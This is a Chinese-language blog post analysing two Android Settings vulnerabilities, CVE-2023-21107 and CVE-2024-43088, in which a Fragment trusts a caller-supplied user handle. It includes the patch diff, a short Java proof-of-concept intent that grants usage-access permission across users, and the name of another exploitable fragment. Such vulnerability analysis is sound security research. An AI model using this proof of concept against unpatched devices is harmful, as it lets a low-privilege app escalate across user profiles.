---
title: 组件缺失校验导致跨用户CVE-2023-21107&CVE-2024-43088
slug: blog/discussion-3/
number: 3
url: https://github.com/CloveIso/notes/discussions/3
date:
  created: 2024-11-21
  updated: 2024-11-21
created: 2024-11-21
updated: 2024-11-21
authors: [Cloveiso]
categories: ['CVE分析']
comments: true
---

# 组件缺失校验导致跨用户CVE-2023-21107&CVE-2024-43088

作为一个关键系统应用，系统设置拥有跨用户权限，此漏洞中的一个 Fragment 接收外部传递的 user handle 而没有任何输入校验和权限检查，然后直接开始使用这个 user handle，这样就使得攻击者可以利用一个低权限的恶意应用，打开 Settings 并传入其他用户的 handle，让高权限的 Settings 错误访问和操作其他用户的数据。

CVE-2023-21107漏洞补丁：[Enforce INTERACT_ACROSS_USERS_FULL permission for NotificationAccessDetails](https://android.googlesource.com/platform/packages/apps/Settings/+/179e5ce2a521710992b5ebdb2d88e0c3b3f2c12b^!/#F0)

CVE-2024-43088漏洞补丁：[Checks cross user permission before handling intent](https://android.googlesource.com/platform/packages/apps/Settings/+/975c28535419be1cc45f66712f41e4a7a40e6001)

## CVE-2024-43088分析

两个漏洞基本一模一样，这里以CVE-2024-43088为例浅浅分析一下

先看一下补丁：

```java
@@ -135,8 +137,13 @@
             }
         }
         if (intent != null && intent.hasExtra(Intent.EXTRA_USER_HANDLE)) {
-            mUserId = ((UserHandle) intent.getParcelableExtra(
-                    Intent.EXTRA_USER_HANDLE)).getIdentifier();
+            mUserId = ((UserHandle) intent.getParcelableExtra(Intent.EXTRA_USER_HANDLE))
+                    .getIdentifier();
+            if (mUserId != UserHandle.myUserId() && !hasInteractAcrossUsersPermission()) {
+                Log.w(TAG, "Intent not valid.");
+                finish();
+                return "";
+            }
         } else {
             mUserId = UserHandle.myUserId();
         }
@@ -159,6 +166,28 @@
         return mPackageName;
     }
 
+    @VisibleForTesting
+    protected boolean hasInteractAcrossUsersPermission() {
+        Activity activity = getActivity();
+        if (!(activity instanceof SettingsActivity)) {
+            return false;
+        }
+        final String callingPackageName =
+                ((SettingsActivity) activity).getInitialCallingPackage();
+
+        if (TextUtils.isEmpty(callingPackageName)) {
+            Log.w(TAG, "Not able to get calling package name for permission check");
+            return false;
+        }
+        if (mPm.checkPermission(Manifest.permission.INTERACT_ACROSS_USERS_FULL, callingPackageName)
+                != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "Package " + callingPackageName + " does not have required permission "
+                    + Manifest.permission.INTERACT_ACROSS_USERS_FULL);
+            return false;
+        }
+        return true;
+    }
+
```

主要添加了hasInteractAcrossUsersPermission。当userID和当前的userID不同时就会调用hasInteractAcrossUsersPermission函数来校验拉起方是否有跨用户权限

找到漏洞位置：public abstract class AppInfoBase extends SettingsPreferenceFragment implements ApplicationsState.Callbacks，是一个fragment，并且是一个抽象类

![aosp.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158042230_aosp.png)

 查找该函数调用：

![image-20241111155852745.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158465468_image-20241111155852745.png)

以com.android.settings.applications.UsageAccessDetails为例，对应的是com.android.settings.Settings.AppUsageAccessSettingsActivity

![image-20241111160036278.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158582299_image-20241111160036278.png)

我们直接拉起他看是什么样的

```
                Intent intent = new Intent();
                intent.setClassName("com.android.settings", "com.android.settings.Settings$AppUsageAccessSettingsActivity");
                intent.setData(Uri.parse("com.android.chrome"));
                startActivity(intent);
```

![image-20241111160719648.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158670050_image-20241111160719648.png)

看到这个界面大概就明白了。就是可以跨用户授权呗

先随便写个应用，申请一下android.permission.PACKAGE_USAGE_STATS权限安装到user10

![image-20241111160202204.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158839396_image-20241111160202204.png)

![image-20241111160314023.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732158981135_image-20241111160314023.png)

现在是不允许状态

![image-20241111160843406.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159148933_image-20241111160843406.png)

然后我们切换回主用户再写一个应用

```
Intent intent = new Intent();
intent.setClassName("com.android.settings", "com.android.settings.Settings$AppUsageAccessSettingsActivity");
intent.setData(Uri.parse("com.android.test5"));
UserHandle us = UserHandle.getUserHandleForUid(1010000);
Log.e(TAG, "onClick: " + us );
intent.putExtra("android.intent.extra.user_handle", us);
startActivity(intent);
```

![image-20241111160549919.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159477345_image-20241111160549919.png)

运行poc之后是这样子的

![image-20241111160600370.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159559467_image-20241111160600370.png)

我们点击允许按钮，然后再切换到user10，这时已经变成已允许了

![image-20241111160909923.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732159825397_image-20241111160909923.png)

## 杂项

com.android.settings.applications.AppInfoBase的子类有很多，该问题代码在AppInfoBase的onCreate函数里就会调用。所以按理来说他的所有子类都是可以利用的。

但是实际并不是这样。由于settings的fragment的启动限制，有两种情况是没法利用的。

一种是只能由点击进入的fragment，例如com.android.settings.applications.AppStorageSettings

还有一种是在FRAGMENT_TO_SPA_APP_DESTINATION_PREFIX_MAP这个map里的

因为在这两个map里的fragment会调用com.android.settings.spa.SpaActivity$Companion.startSpaActivityForApp函数

![image-20241111170151967.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732160032804_image-20241111170151967.png)

startSpaActivityForApp函数会从intent中获取包名。然后末尾加上当前的userID，导致无法利用

![image-20241111170218170.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732172359362_image-20241111170218170.png)

那么还有哪些fragment可以利用呢，我仔细过滤了一遍：

然后只发现了一个0.0

com.android.settings.applications.appinfo.LongBackgroundTasksDetails

![image-20241111170554992.png](https://98d91d58.cloudflare-imgbed-d3m.pages.dev/file/1732172423758_image-20241111170554992.png)



